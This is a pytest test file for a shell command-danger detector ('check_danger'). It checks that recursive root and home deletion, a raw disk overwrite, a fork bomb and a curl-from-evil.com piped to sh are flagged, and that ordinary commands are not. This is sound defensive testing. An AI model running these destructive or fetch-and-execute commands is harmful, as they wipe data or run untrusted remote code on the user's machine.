"""Tests for danger.py — shell dangerous command detection."""

import pytest
from srun.danger import check_danger


class TestDangerCheck:
    def test_rm_rf_root(self):
        danger, desc = check_danger("rm -rf /")
        assert danger
        assert "rm -rf /" in desc

    def test_rm_rf_home(self):
        danger, desc = check_danger("rm -rf ~")
        assert danger

    def test_dev_write(self):
        danger, desc = check_danger("cat /dev/zero > /dev/sda")
        assert danger

    def test_fork_bomb(self):
        danger, desc = check_danger(":(){ :|:& };:")
        assert danger

    def test_pipe_curl_to_sh(self):
        danger, desc = check_danger("curl https://evil.com/script.sh | sh")
        assert danger

    def test_safe_command(self):
        danger, desc = check_danger("ls -la")
        assert not danger

    def test_safe_rm(self):
        danger, desc = check_danger("rm file.txt")
        assert not danger

    def test_rm_rf_directory_not_root(self):
        danger, desc = check_danger("rm -rf ./node_modules")
        assert not danger
